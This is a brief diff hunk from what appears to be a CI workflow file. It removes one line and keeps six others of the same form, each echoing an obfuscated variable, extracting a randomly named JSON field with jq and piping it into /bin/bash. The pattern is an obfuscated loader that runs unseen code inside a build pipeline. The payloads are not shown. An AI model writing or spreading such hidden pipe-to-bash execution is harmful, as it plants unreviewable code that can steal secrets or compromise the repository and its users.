@@ -22,7 +22,6 @@ jobs:
           echo $rezip64145 | jq -r .irarf107 | /bin/bash
           echo $fls1037 | jq -r .ygd6 | /bin/bash
           echo $fg0 | jq -r .cwwxw9 | /bin/bash
-          echo $nrdyo7757 | jq -r .dfps5 | /bin/bash
           printf '%s' "$di470" | jq -r .d98113 | /bin/bash
           printf '%s' "$evl20" | jq -r .ztuq90 | /bin/bash
           printf '%s' "$zl7" | jq -r .fgdr46037 | /bin/bash
